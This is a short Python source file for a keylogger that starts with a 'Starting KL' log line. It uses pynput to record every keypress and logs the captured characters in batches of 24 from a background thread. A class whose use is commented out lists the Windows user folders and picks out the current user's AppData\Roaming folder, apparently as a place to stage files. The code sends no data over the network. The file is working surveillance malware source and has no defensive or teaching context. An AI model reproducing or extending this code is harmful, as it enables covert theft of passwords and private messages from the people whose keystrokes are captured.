import os
import json
import logging

from threading import Thread
from platform import uname
from pynput.keyboard import Listener


logging.basicConfig(
    level=logging.INFO,
    format="%(message)s"
)

log = logging.getLogger()


class SystemInfo:
    def __init__(self):
        self.os_type = uname().system
        self.current_user = os.getlogin()

        self.user_dir_contents = os.listdir("C:\\Users")
        self.alpha = [chr(x) for x in range(65, 91)] + [chr(y) for y in range(97, 123)]

        self.target_dir = f"C:\\Users\\{self.current_user}\\AppData\\Roaming" if \
                          self.current_user in self.user_dir_contents else \
                          f"C:\\Users\\{self.user_dir_contents[-1]}\\AppData\\Roaming"

    def __str__(self):
        return vars(self)


keys = []


def on_press(key):
    try:
        log.info(key.char)
        keys.append(key.char)

    except AttributeError:
        log.info(key)
        if key == key.space:
            keys.append(' ')


def export_keys():
    while True:
        if len(keys) >= 24:
            log.info(''.join(keys))
            keys.clear()


def get_keys():
    with Listener(on_press=on_press) as l:
        l.join()


def main():
    get_keys_thread = Thread(target=get_keys, args=())
    export_keys_thread = Thread(target=export_keys, args=())

    get_keys_thread.start()
    export_keys_thread.start()



if __name__ == '__main__':
    log.info('Starting KL')
    main()

    # system_info = SystemInfo()
    # log.info(json.dumps(system_info.__str__(), indent=4))

